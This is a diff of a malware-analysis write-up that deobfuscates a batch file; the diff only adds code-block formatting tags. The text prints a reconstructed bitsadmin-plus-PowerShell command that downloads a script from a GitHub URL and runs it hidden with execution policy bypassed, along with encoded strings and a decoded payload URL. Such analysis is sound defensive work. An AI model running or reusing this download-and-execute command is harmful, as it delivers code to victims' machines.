@@ -97,15 +97,19 @@ RTYbrtgVEWRqqwer=LU5vUC@@@@@@At@@@@@@@@@d@@@@@2l@@@@@@@@@@O@@@@@@@ZG93@@@@@@U@@@
 
 The very last line of the script suggest that the full command being constructed and executed.
 
+{% code overflow="wrap" fullWidth="false" %}
 ```
 %QWERfcerWEDfcvtbytTYR% "%iUYTbyteVERTfer%" %KIUYntyERverERF% %cd%\%NbfdsvREVntySRE% && %CVWQeFEWRFQWEd% %QWWEcdweWERee% "%cd%\%NbfdsvREVntySRE%"
 ```
+{% endcode %}
 
 Using the same techniques from the sections before to reconstruct the command executed by this batch file.
 
+{% code overflow="wrap" %}
 ```batch
 bitsadmin.exe /transfer "f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810" https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 C:\path\to\stacy.ps1 && powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND "C:\path\to\stacy.ps1"
 ```
+{% endcode %}
 
 As seen above, the command uses **bitsadmin** and **powershell** to download and execute a powershell script named **stacy.ps1**
 
@@ -200,9 +204,11 @@ Expand-Archive $zipFileName -DestinationPath $outputFolderName;
 
 Encoded string in **downloadUrl** variable:
 
+{% code overflow="wrap" %}
 ```
 =\x90A\x90X\x90a\x906\x905\x90S\x90b\x90v\x901\x902\x90c\x905\x90N\x90W\x90Y\x900\x90N\x903\x90L\x90j\x90N\x90X\x90a\x90t\x909\x90i\x90c\x90l\x90R\x903\x90c\x90h\x901\x902\x90L\x903\x90F\x90m\x90c\x90v\x90M\x90X\x90Z\x90s\x90B\x90X\x90b\x90h\x90N\x90X\x90L\x90l\x90x\x90W\x90a\x90m\x909\x90C\x90M\x90t\x90I\x90T\x90L\x900\x90V\x90m\x90b\x90y\x90V\x90G\x90d\x90u\x90l\x900\x90L\x90t\x909\x902\x90Y\x90u\x90I\x90W\x90d\x90o\x90R\x90X\x90a\x90n\x909\x90y\x90L\x906\x90M\x90H\x90c\x900\x90R\x90H\x90a\x90
 ```
+{% endcode %}
 
 Decoded string in **downloadUrl** variable:
 
@@ -212,9 +218,11 @@ https://github.com/Internet-2-0/file-samples/raw/master/misc/stacysmom.zip
 
 Encoded string in **executablePath** variable:
 
+{% code overflow="wrap" %}
 ```
 l\x90h\x90X\x90Z\x90u\x90w\x90G\x90b\x90l\x90h\x902\x90c\x90y\x90V\x902\x90d\x90v\x90B\x90H\x90X\x90w\x904\x90S\x90M\x902\x90x\x90F\x90b\x90s\x90V\x90G\x90a\x90T\x90J\x90X\x90Z\x903\x909\x90G\x90U\x90z\x90d\x903\x90b\x90k\x905\x90W\x90a\x90X\x90x\x90l\x90M\x90z\x900\x90W\x90Z\x900\x90N\x90X\x90e\x90T\x90x\x901\x90c\x903\x909\x90G\x90Z\x90u\x90l\x902\x90V\x90c\x90p\x90z\x90Q
 ```
+{% endcode %}
 
 Decoded string in **executablePath** variable:
 
